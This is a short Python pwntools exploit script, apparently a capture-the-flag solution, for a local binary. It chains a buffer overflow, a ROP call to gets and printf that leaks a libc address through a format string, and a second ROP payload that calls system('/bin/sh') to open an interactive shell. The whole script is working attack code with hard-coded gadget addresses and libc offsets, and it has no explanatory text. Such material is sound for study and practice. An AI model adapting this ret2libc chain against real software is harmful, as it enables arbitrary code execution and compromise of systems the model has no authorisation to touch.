# exploit use formatstring to leak libc functions 

vuln_addr = 0x4011dd
main_addr = 0x40120e

IO_2_1_stdin_offset = 0x00000000001ec980
system_offset = 0x0000000000052290
binsh_offset = 0x1b45bd # strings -tx /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep "/bin/sh"

from pwn import *

elf = ELF("./something")
p = elf.process()
# gdb.attach(p)

print(p.recvuntil("thing : "))

pad = "A" * 0x28

gets_plt = 0x401090
printf_plt = 0x401080
prdi = 0x4012a3
ret = 0x40101a
fmt_string = 0x404500

payload1 = ""
payload1 += pad
payload1 += p64(ret) + p64(prdi) + p64(fmt_string) + p64(gets_plt)
payload1 += p64(ret) + p64(prdi) + p64(fmt_string) + p64(printf_plt)
# call gets -> format string leak value register
payload1 += p64(ret) + p64(vuln_addr)

parameter = "%3$p"

p.sendline(payload1)
sleep(1)
p.sendline(parameter)

output = p.recvuntil("something : ")
stdin = output.split("Say")[0]
log.success("stdin address: " + stdin)
stdin = int(stdin, 16)
# print(type(stdin))

libc_base = stdin - IO_2_1_stdin_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.success("libc base address: " + hex(libc_base))
log.success("system address: " + hex(system))
log.success("binsh address: " + hex(binsh))

payload2 = ""
payload2 += pad
payload2 += p64(ret) + p64(prdi) + p64(binsh) + p64(system)

p.sendline(payload2)

p.interactive()


